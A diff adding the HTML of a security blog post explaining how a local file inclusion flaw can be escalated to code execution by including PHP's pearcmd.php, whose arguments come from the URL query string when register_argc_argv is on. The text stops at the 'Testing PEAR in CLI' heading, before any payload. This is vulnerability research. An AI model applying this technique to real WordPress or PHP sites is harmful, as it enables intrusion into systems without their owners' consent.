@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Exploiting LFI2RCE Vulnerability via PHP PEARCMD - Bui Van Y</title><meta name="author" content="Bui Van Y">
+<meta name="description" content="Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php"><meta name="keywords" content='analyst, lfi, plugin, pearcmd'>
+  <meta itemprop="name" content="Exploiting LFI2RCE Vulnerability via PHP PEARCMD">
+  <meta itemprop="description" content="Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php">
+  <meta itemprop="datePublished" content="2025-10-22T20:48:00+07:00">
+  <meta itemprop="dateModified" content="2025-10-22T20:48:00+07:00">
+  <meta itemprop="wordCount" content="2714">
+  <meta itemprop="image" content="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png">
+  <meta itemprop="keywords" content="Analyst,Lfi,Plugin,Pearcmd"><meta property="og:url" content="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/">
+  <meta property="og:site_name" content="Bui Van Y">
+  <meta property="og:title" content="Exploiting LFI2RCE Vulnerability via PHP PEARCMD">
+  <meta property="og:description" content="Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-10-22T20:48:00+07:00">
+    <meta property="article:modified_time" content="2025-10-22T20:48:00+07:00">
+    <meta property="article:tag" content="Analyst">
+    <meta property="article:tag" content="Lfi">
+    <meta property="article:tag" content="Plugin">
+    <meta property="article:tag" content="Pearcmd">
+    <meta property="og:image" content="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png">
+  <meta name="twitter:title" content="Exploiting LFI2RCE Vulnerability via PHP PEARCMD">
+  <meta name="twitter:description" content="Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php">
+<meta name="application-name" content="Bui Van Y">
+<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" title="Exploiting LFI2RCE Vulnerability via PHP PEARCMD - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/2025-10-22-cve-2025-11361/" title="CVE-2025-11361 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2025-10-23-cve-2023-36679/" title="CVE-2023-36679 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.md" title="Exploiting LFI2RCE Vulnerability via PHP PEARCMD - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Exploiting LFI2RCE Vulnerability via PHP PEARCMD",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd\/"
+    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, lfi, plugin, pearcmd","wordcount":  2714 ,
+    "url": "http:\/\/localhost:1313\/posts\/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd\/","datePublished": "2025-10-22T20:48:00+07:00","dateModified": "2025-10-22T20:48:00+07:00","publisher": {
+      "@type": "Organization",
+      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
+        "@type": "Person",
+        "name": "Bui Van Y"
+      },"description": "Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php"
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li><li class="menu-item language-switch">
+            <span role="button" aria-label="Select Language" title="Select Language"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
+            <ul class="sub-menu"><li class="menu-item"><span class="text-secondary" title="English">English</span></li><li class="menu-item"><a href="/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" class="menu-link" title="Vietnamese">Vietnamese</a></li></ul>
+          </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
+              <span role="button" aria-label="Select Language" title="Select Language">English<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
+              <select class="language-select" onchange="location = this.value;"><option value="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" selected disabled>English</option><option value="/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/">Vietnamese</option></select>
+            </span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
+      <div class="details-summary related-summary">
+        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
+        <span class="related-title">Related Content</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
+      <div class="details-content related-content">
+        <ul class="related-list"><li class="related-item">
+              <a href="/posts/2025-10-21-cve-2025-32141/" title="CVE-2025-32141 Analysis &amp; POC">CVE-2025-32141 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/posts/2025-10-20-cve-2025-52716/" title="CVE-2025-52716 Analysis &amp; POC">CVE-2025-52716 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/posts/2025-10-19-cve-2025-6715/" title="CVE-2025-6715 Analysis &amp; POC">CVE-2025-6715 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/posts/2025-10-18-cve-2025-26909/" title="CVE-2025-26909 Analysis &amp; POC">CVE-2025-26909 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/posts/2025-10-17-cve-2025-39399/" title="CVE-2025-39399 Analysis &amp; POC">CVE-2025-39399 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/posts/2025-10-16-cve-2025-30782/" title="CVE-2025-30782 Analysis &amp; POC">CVE-2025-30782 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/posts/2025-10-15-cve-2025-30868/" title="CVE-2025-30868 Analysis &amp; POC">CVE-2025-30868 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/posts/2025-10-14-cve-2025-32654/" title="CVE-2025-32654 Analysis &amp; POC">CVE-2025-32654 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/posts/2025-10-13-cve-2025-48293/" title="CVE-2025-48293 Analysis &amp; POC">CVE-2025-48293 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/posts/2025-10-12-cve-2025-53328/" title="CVE-2025-53328 Analysis &amp; POC">CVE-2025-53328 Analysis &amp; POC</a></li></ul>
+      </div>
+    </div></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Exploiting LFI2RCE Vulnerability via PHP PEARCMD</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Author" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/cve-analyst/" class="post-category" title="Category - CVE Analyst"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analyst</a></span></div><div class="post-meta-line"><span title="published on 2025-10-22 20:48:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-22">2025-10-22</time></span>&nbsp;<span title="2714 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>13 minutes</span>&nbsp;</div>
+    </div><div class="featured-image"><img src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png' alt="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#what-are-pear-and-pecl">What are PEAR and PECL?</a></li>
+    <li><a href="#pearcmdphp-and-register_argc_argv"><code>pearcmd.php</code> and <code>register_argc_argv</code></a></li>
+    <li><a href="#analysis-of-php-source-code">Analysis of PHP Source Code</a></li>
+    <li><a href="#rfc3875-explain">RFC3875 Explain</a></li>
+    <li><a href="#testing-pear-in-cli">Testing PEAR in CLI</a></li>
+    <li><a href="#pearcmd-code-analysis"><code>pearcmd</code> Code Analysis</a></li>
+    <li><a href="#flow">Flow</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>Hello. After analyzing 10 CVEs related to LFI in WordPress plugins, I noticed a common barrier: many exploitation vectors are constrained by the requirement to <strong>have a <code>.php</code> suffix</strong>. This significantly reduces exploitability. During my research I found the article <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"target="_blank" rel="external nofollow noopener noreferrer">docker-php-include-getshell</a>. That article describes a way to <strong>bypass the <code>.php</code> constraint</strong> by abusing the <code>pearcmd.php</code> file which is part of PHP&rsquo;s <strong>PECL/PEAR</strong> toolkit and is present in WordPress environments deployed on Docker — a very practical trick for no-upload scenarios.</p>
+<h2 class="heading-element" id="what-are-pear-and-pecl"><span>What are PEAR and PECL?</span>
+  <a href="#what-are-pear-and-pecl" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li><strong>PECL (PHP Extension Community Library)</strong>: a command-line tool to install and manage PHP extensions.</li>
+<li><strong>PEAR (PHP Extension and Application Repository)</strong>: the library platform used by PECL.</li>
+</ul>
+<p>Before PHP <code>7.3</code>, PEAR/PECL were often installed by default.
+From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</code> to include them.</p>
+<p>However, in official PHP Docker images, PEAR/PECL <strong>are still often included</strong>, located under <code>/usr/local/lib/php</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# ls /usr/local/lib/php
+</span></span><span class="line"><span class="cl">Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="pearcmdphp-and-register_argc_argv"><span><code>pearcmd.php</code> and <code>register_argc_argv</code></span>
+  <a href="#pearcmdphp-and-register_argc_argv" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>pearcmd.php</code> is a PHP script designed to run in CLI mode, for example:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">php /usr/local/lib/php/pearcmd.php install somepackage</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It processes arguments from <code>$argv</code> and <code>$argc</code>. When run as CLI this data is obvious. If this file is included in a web context (via LFI), its CLI logic can be abused.</p>
+<p>The key point is the <code>register_argc_argv</code> setting. If <code>register_argc_argv = On</code>, PHP will populate:</p>
+<ul>
+<li><code>$argc</code></li>
+<li><code>$argv</code></li>
+<li><code>$_SERVER['argv']</code></li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png" title="`argv` in PHP configuration" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png" data-sub-html="<h2>argv</h2><p>`argv` in PHP configuration</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png' alt="argv" height="190" width="844"></a><figcaption class="image-caption">`argv` in PHP configuration</figcaption>
+  </figure></p>
+<p>When WordPress is set up on Docker, <code>register_argc_argv</code> is often enabled by default. The question becomes: when PHP runs under a web SAPI (FPM/Apache) and not in CLI, where does <code>$argv</code> come from?</p>
+<h2 class="heading-element" id="analysis-of-php-source-code"><span>Analysis of PHP Source Code</span>
+  <a href="#analysis-of-php-source-code" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>In the PHP core there is logic like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">PG</span><span class="p">(</span><span class="n">register_argc_argv</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">php_build_argv</span><span class="p">(</span><span class="nf">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">query_string</span><span class="p">,</span> <span class="o">&amp;</span><span class="nf">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_SERVER</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>If there is no <code>argc</code> (not running CLI), PHP calls <code>php_build_argv</code> with <code>SG(request_info).query_string</code> — i.e., the URL&rsquo;s <strong>query string</strong>. For example:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://example.com/index.php?a=b&amp;c=d</span></span></code></pre></td></tr></table>
+</div>
+</div><p>→ <code>query_string = &quot;a=b&amp;c=d&quot;</code></p>
+<p>PHP will use this query string to build the <code>argv</code> variables, so <code>$_SERVER['argv']</code> can be influenced by the query string.</p>
+<p><strong>Consequence</strong>:</p>
+<p>When <code>pearcmd.php</code> is included via LFI in a web environment where <code>$_SERVER['argv']</code> is generated from the query string, an attacker can control the command-line parameters that <code>pearcmd.php</code> reads. Thus, PEAR/PECL command functionality can be abused via the web to perform unwanted actions.</p>
+<h2 class="heading-element" id="rfc3875-explain"><span>RFC3875 Explain</span>
+  <a href="#rfc3875-explain" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>RFC3875 (the CGI spec) defines a form of <strong>&ldquo;indexed&rdquo; HTTP query</strong> — that is, a query string without unencoded <code>=</code> characters sent via GET or HEAD.</p>
+<p>When encountering such a query, the server <strong>SHOULD</strong> treat the query-string as a <strong>search-string</strong>, splitting it into <strong>search-words</strong> separated by <code>+</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">search-string = search-word ( &#34;+&#34; search-word )
+</span></span><span class="line"><span class="cl">search-word = 1*schar</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After splitting, each <code>search-word</code> is URL-decoded, optionally re-encoded as system-defined, then <strong>added to the command-line argument list (<code>argv</code>)</strong> of the CGI program.</p>
+<p>In short: if the query-string contains no <code>=</code> and is a GET or HEAD request, the server may treat parts separated by <code>+</code> as arguments and pass them into <code>argv</code>.</p>
+<p><strong>RFC3875</strong> allows a server to turn an &ldquo;indexed&rdquo; query-string (GET/HEAD, no unencoded <code>=</code>) into an argv list. The spec excerpt:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4.4. The Script Command Line
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Some systems support a method for supplying an array of strings to
+</span></span><span class="line"><span class="cl">the CGI script. This is only used in the case of an &#39;indexed&#39; HTTP
+</span></span><span class="line"><span class="cl">query, which is identified by a &#39;GET&#39; or &#39;HEAD&#39; request with a URI
+</span></span><span class="line"><span class="cl">query string that does not contain any unencoded &#34;=&#34; characters. For
+</span></span><span class="line"><span class="cl">such a request, the server SHOULD treat the query-string as a
+</span></span><span class="line"><span class="cl">search-string and parse it into words, using the rules
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">search-string = search-word ( &#34;+&#34; search-word )
+</span></span><span class="line"><span class="cl">search-word = 1*schar
+</span></span><span class="line"><span class="cl">schar = unreserved | escaped | xreserved
+</span></span><span class="line"><span class="cl">xreserved = &#34;;&#34; | &#34;/&#34; | &#34;?&#34; | &#34;:&#34; | &#34;@&#34; | &#34;&amp;&#34; | &#34;=&#34; | &#34;,&#34; |
+</span></span><span class="line"><span class="cl">&#34;$&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">After parsing, each search-word is URL-decoded, optionally encoded in
+</span></span><span class="line"><span class="cl">a system-defined manner and then added to the command line argument
+</span></span><span class="line"><span class="cl">list.</span></span></code></pre></td></tr></table>
+</div>
+</div><p>PHP previously had a vulnerability related to this (<a href="https://nvd.nist.gov/vuln/detail/cve-2012-1823"target="_blank" rel="external nofollow noopener noreferrer">CVE-2012-1823</a>). Today, PHP handles the query-string more broadly than RFC suggests — even when the query-string contains <code>=</code>, it can still be added to <code>$_SERVER['argv']</code>.</p>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png" title="PHP still adds query strings containing &#39;=&#39; into $_SERVER\[&#39;argv&#39;]" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png" data-sub-html="<h2>equal</h2><p>PHP still adds query strings containing &#39;=&#39; into $_SERVER\[&#39;argv&#39;]</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png' alt="equal" height="276" width="1058"></a><figcaption class="image-caption">PHP still adds query strings containing '=' into $_SERVER\['argv']</figcaption>
+  </figure></p>
+<p>👉 By passing a query string like <code>?a+b+c+...</code>, PHP will split on <code>+</code> and create <code>$_SERVER['argv']</code> as an array <code>['a', 'b', 'c', ...]</code>, consistent with RFC3875 semantics.</p>
+<h2 class="heading-element" id="testing-pear-in-cli"><span>Testing PEAR in CLI</span>
+  <a href="#testing-pear-in-cli" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
